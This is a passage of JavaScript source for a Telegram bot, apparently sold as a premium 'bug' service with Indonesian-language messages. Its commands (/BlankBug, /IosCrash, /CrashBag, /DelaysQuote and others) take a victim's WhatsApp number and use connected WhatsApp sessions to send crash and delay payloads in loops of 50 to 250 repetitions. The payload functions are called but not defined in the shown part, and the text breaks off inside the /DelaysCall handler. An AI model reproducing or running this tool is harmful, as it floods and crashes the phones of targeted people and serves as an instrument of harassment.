\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 50x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈... ⏳  

💡 𝐍𝐨𝐭𝐞:  
Setelah proses bug selesai,  
beri jeda *minimal 5 menit* agar sender  
tetap stabil dan tidak logout.
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      for (let i = 0; i < 50; i++) {        
          await lengCauna(target) ;
          await Sxsystem(target);
          await voldBurstX(sock, target, ptcp = true);
          await VcardXFc(target);
          await mikirKidz(sock, target);
          await sleep(globalSpeed);
          }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 50x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : ✅ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑬𝒙𝒆𝒄𝒖𝒕𝒆𝒅  

💡 𝐍𝐨𝐭𝐞:  
Bug telah berhasil dijalankan.  
Disarankan beri jeda *5 menit* ⏳  
agar sistem tetap stabil & aman.
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/DelayEasy (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const mention = jid;
  const target = jid;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
   
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
  return bot.sendMessage(
    chatId,
    "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot."
  );
}

const sessionKeys = [...sessions.keys()];
const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
const sock = sessions.get(randomKey);

if (!sock) {
  return bot.sendMessage(
    chatId,
    "⚠️ Gagal mengambil sesi aktif. Coba ulangi /addbot lagi."
  );
}

console.log(chalk.cyan(`[SESSION] Menggunakan bot: ${randomKey}`));
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 200x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈... ⏳  

💡 𝐍𝐨𝐭𝐞:  
Setelah proses bug selesai,  
beri jeda *minimal 5 menit* agar sender  
tetap stabil dan tidak logout.
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      for (let i = 0; i < 200; i++) {        
          await lengCauna(target);
          await sleep(globalSpeed);
          }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 200x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : ✅ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑬𝒙𝒆𝒄𝒖𝒕𝒆𝒅  

💡 𝐍𝐨𝐭𝐞:  
Bug telah berhasil dijalankan.  
Disarankan beri jeda *5 menit* ⏳  
agar sistem tetap stabil & aman.
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/BlankBug (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const mention = jid;
  const target = jid;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
   
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
  return bot.sendMessage(
    chatId,
    "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot."
  );
}

const sessionKeys = [...sessions.keys()];
const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
const sock = sessions.get(randomKey);

if (!sock) {
  return bot.sendMessage(
    chatId,
    "⚠️ Gagal mengambil sesi aktif. Coba ulangi /addbot lagi."
  );
}

console.log(chalk.cyan(`[SESSION] Menggunakan bot: ${randomKey}`));
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 50x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈... ⏳  

💡 𝐍𝐨𝐭𝐞:  
Setelah proses bug selesai,  
beri jeda *minimal 5 menit* agar sender  
tetap stabil dan tidak logout.
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      for (let i = 0; i < 50; i++) {        
          await BlankNotif(target, ptcp = true);
          await KillerHorseXUiForce(target);
          await Ggwp(target);
          await BlankClickOne(sock, target);
          await sleep(globalSpeed);
          }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 50x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : ✅ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑬𝒙𝒆𝒄𝒖𝒕𝒆𝒅  

💡 𝐍𝐨𝐭𝐞:  
Bug telah berhasil dijalankan.  
Disarankan beri jeda *5 menit* ⏳  
agar sistem tetap stabil & aman.
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/LocationBug (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const mention = jid;
  const target = jid;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
   
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
  return bot.sendMessage(
    chatId,
    "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot."
  );
}

const sessionKeys = [...sessions.keys()];
const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
const sock = sessions.get(randomKey);

if (!sock) {
  return bot.sendMessage(
    chatId,
    "⚠️ Gagal mengambil sesi aktif. Coba ulangi /addbot lagi."
  );
}

console.log(chalk.cyan(`[SESSION] Menggunakan bot: ${randomKey}`));
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 200x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈... ⏳  

💡 𝐍𝐨𝐭𝐞:  
Setelah proses bug selesai,  
beri jeda *minimal 5 menit* agar sender  
tetap stabil dan tidak logout.
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      for (let i = 0; i < 200; i++) {        
          await LocaNewOtax(sock, target);
          await sleep(globalSpeed);
          }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 200x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : ✅ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑬𝒙𝒆𝒄𝒖𝒕𝒆𝒅  

💡 𝐍𝐨𝐭𝐞:  
Bug telah berhasil dijalankan.  
Disarankan beri jeda *5 menit* ⏳  
agar sistem tetap stabil & aman.
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/IosCrash (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const mention = jid;
  const target = jid;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
   
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
  return bot.sendMessage(
    chatId,
    "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot."
  );
}

const sessionKeys = [...sessions.keys()];
const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
const sock = sessions.get(randomKey);

if (!sock) {
  return bot.sendMessage(
    chatId,
    "⚠️ Gagal mengambil sesi aktif. Coba ulangi /addbot lagi."
  );
}

console.log(chalk.cyan(`[SESSION] Menggunakan bot: ${randomKey}`));
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 250x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈... ⏳  

💡 𝐍𝐨𝐭𝐞:  
Setelah proses bug selesai,  
beri jeda *minimal 5 menit* agar sender  
tetap stabil dan tidak logout.
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      for (let i = 0; i < 250; i++) {        
          await iosinVisFC3(sock, target);
          await sleep(globalSpeed);
          }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 250x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : ✅ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑬𝒙𝒆𝒄𝒖𝒕𝒆𝒅  

💡 𝐍𝐨𝐭𝐞:  
Bug telah berhasil dijalankan.  
Disarankan beri jeda *5 menit* ⏳  
agar sistem tetap stabil & aman.
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/CrashBag (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const mention = jid;
  const target = jid;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
   
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
  return bot.sendMessage(
    chatId,
    "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot."
  );
}

const sessionKeys = [...sessions.keys()];
const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
const sock = sessions.get(randomKey);

if (!sock) {
  return bot.sendMessage(
    chatId,
    "⚠️ Gagal mengambil sesi aktif. Coba ulangi /addbot lagi."
  );
}

console.log(chalk.cyan(`[SESSION] Menggunakan bot: ${randomKey}`));
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 100x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈... ⏳  

💡 𝐍𝐨𝐭𝐞:  
Setelah proses bug selesai,  
beri jeda *minimal 5 menit* agar sender  
tetap stabil dan tidak logout.
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      for (let i = 0; i < 100; i++) {        
          await kresjandaotax(sock, target);
          await sleep(globalSpeed);
          }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 100x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : ✅ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑬𝒙𝒆𝒄𝒖𝒕𝒆𝒅  

💡 𝐍𝐨𝐭𝐞:  
Bug telah berhasil dijalankan.  
Disarankan beri jeda *5 menit* ⏳  
agar sistem tetap stabil & aman.
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/DelaysQuote (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const mention = jid;
  const target = jid;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
   
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᗷΣᒪIᗩᑌ", url: AKSES_URL }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
  return bot.sendMessage(
    chatId,
    "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addbot 628xxx untuk menambahkan bot."
  );
}

const sessionKeys = [...sessions.keys()];
const randomKey = sessionKeys[Math.floor(Math.random() * sessionKeys.length)];
const sock = sessions.get(randomKey);

if (!sock) {
  return bot.sendMessage(
    chatId,
    "⚠️ Gagal mengambil sesi aktif. Coba ulangi /addbot lagi."
  );
}

console.log(chalk.cyan(`[SESSION] Menggunakan bot: ${randomKey}`));
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 200x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈... ⏳  

💡 𝐍𝐨𝐭𝐞:  
Setelah proses bug selesai,  
beri jeda *minimal 5 menit* agar sender  
tetap stabil dan tidak logout.
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      for (let i = 0; i < 200; i++) {        
          await GsMmL(target);
          await sleep(globalSpeed);
          }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
╔══ ✦ SPESIAL SCRIPT ✦ ══╗  
        O L Y M P U S 
╚════════════════════╝  

▢ 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 : ${formattedNumber}  
▢ 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩 : 200x  
▢ 𝐒𝐭𝐚𝐭𝐮𝐬 𝐁𝐮𝐠 : ✅ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑬𝒙𝒆𝒄𝒖𝒕𝒆𝒅  

💡 𝐍𝐨𝐭𝐞:  
Bug telah berhasil dijalankan.  
Disarankan beri jeda *5 menit* ⏳  
agar sistem tetap stabil & aman.
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `⚡ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/DelaysCall (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const mention = jid;
  const target = jid;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
  if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY MODE ACTIVE Ϟ ]</b>
🔒 <b>Verifikasi Diperlukan!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
   
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


